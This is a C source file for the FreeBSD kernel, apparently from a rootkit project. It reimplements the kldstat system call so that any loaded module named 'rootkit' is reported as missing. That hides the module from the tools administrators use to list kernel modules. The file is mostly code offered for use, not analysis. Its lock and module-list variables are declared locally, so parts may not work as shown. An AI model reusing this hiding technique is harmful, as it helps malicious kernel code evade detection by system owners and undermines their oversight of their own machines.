#ifndef HOOK_C
#define HOOK_C 1

#include <sys/cdefs.h>
__FBSDID("$FreeBSD$");

// #include "opt_ddb.h"
// #include "opt_kld.h"
// #include "opt_hwpmc_hooks.h"

#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/malloc.h>
#include <sys/sysproto.h>
#include <sys/sysent.h>
#include <sys/priv.h>
#include <sys/proc.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/module.h>
#include <sys/mount.h>
#include <sys/linker.h>
#include <sys/eventhandler.h>
#include <sys/fcntl.h>
#include <sys/jail.h>
#include <sys/libkern.h>
#include <sys/namei.h>
// #include <sys/vnode.h>
#include <sys/syscallsubr.h>
#include <sys/sysctl.h>

#include <sys/syscall.h>



int
sys_kldstat_mod(struct thread *td, struct kldstat_args *uap);
int
kern_kldstat_mod(struct thread *td, int fileid, struct kld_file_stat *stat);

static linker_file_t linker_find_file_by_id(int _fileid);



static struct sx kld_sx; 

static linker_file_list_t linker_files;

int
sys_kldstat_mod(struct thread *td, struct kldstat_args *uap)
{
	struct kld_file_stat *stat;
	int error, version;

	/*
	 * Check the version of the user's structure.
	 */
	if ((error = copyin(&uap->stat->version, &version, sizeof(version)))
	    != 0)
		return (error);
	if (version != sizeof(struct kld_file_stat_1) &&
	    version != sizeof(struct kld_file_stat))
		return (EINVAL);

	stat = malloc(sizeof(*stat), M_TEMP, M_WAITOK | M_ZERO);
	error = kern_kldstat_mod(td, uap->fileid, stat);
	if (error == 0)
		error = copyout(stat, uap->stat, version);
	free(stat, M_TEMP);
	return (error);
}

int
kern_kldstat_mod(struct thread *td, int fileid, struct kld_file_stat *stat)
{
	linker_file_t lf;
	int namelen;
#ifdef MAC
	int error;

	error = mac_kld_check_stat(td->td_ucred);
	if (error)
		return (error);
#endif

	sx_xlock(&kld_sx);
	lf = linker_find_file_by_id(fileid);
	if (lf == NULL || strcmp(lf->filename, "rootkit") == 0) { // XXX edit Here // TODO
		sx_xunlock(&kld_sx);
		return (ENOENT);
	}

	/* Version 1 fields: */
	namelen = strlen(lf->filename) + 1;
	if (namelen > sizeof(stat->name))
		namelen = sizeof(stat->name);
	bcopy(lf->filename, &stat->name[0], namelen);
	stat->refs = lf->refs;
	stat->id = lf->id;
	stat->address = lf->address;
	stat->size = lf->size;
	/* Version 2 fields: */
	namelen = strlen(lf->pathname) + 1;
	if (namelen > sizeof(stat->pathname))
		namelen = sizeof(stat->pathname);
	bcopy(lf->pathname, &stat->pathname[0], namelen);
	sx_xunlock(&kld_sx);

	td->td_retval[0] = 0;
	return (0);
}


static linker_file_t
linker_find_file_by_id(int fileid)
{
	linker_file_t lf;

	sx_assert(&kld_sx, SA_XLOCKED);
	TAILQ_FOREACH(lf, &linker_files, link)
		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
			break;
	return (lf);
}

#endif